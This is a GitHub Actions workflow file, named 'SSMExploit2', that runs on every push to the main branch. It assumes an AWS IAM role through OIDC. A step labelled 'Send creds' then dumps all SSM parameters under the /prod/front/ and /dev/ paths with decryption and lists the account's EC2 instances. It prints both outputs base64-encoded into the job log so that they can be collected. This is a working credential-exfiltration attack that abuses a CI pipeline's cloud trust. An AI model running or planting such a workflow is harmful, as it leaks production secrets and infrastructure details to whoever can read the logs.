name: SSMExploit2
on:
  push:
    branches:
      - main
jobs:
  shell:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Request AWS OIDC Token
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::707925622666:role/goti-dev-github-actions-role
          aws-region: ap-northeast-2
          audience: sts.amazonaws.com
      - name: Send creds
        run: |
          aws ssm get-parameters-by-path --path /prod/front/ --recursive --with-decryption --region ap-northeast-2 > ssm_output.txt 2>&1 || true
          aws ssm get-parameters-by-path --path /dev/ --recursive --with-decryption --region ap-northeast-2 >> ssm_output.txt 2>&1 || true
          aws ec2 describe-instances --region ap-northeast-2 > ec2_output.txt 2>&1 || true
          echo "=== SSM PARAMS BEGIN ==="
          cat ssm_output.txt | base64
          echo "=== SSM PARAMS END ==="
          echo "=== EC2 OUTPUT BEGIN ==="
          cat ec2_output.txt | base64
          echo "=== EC2 OUTPUT END ==="
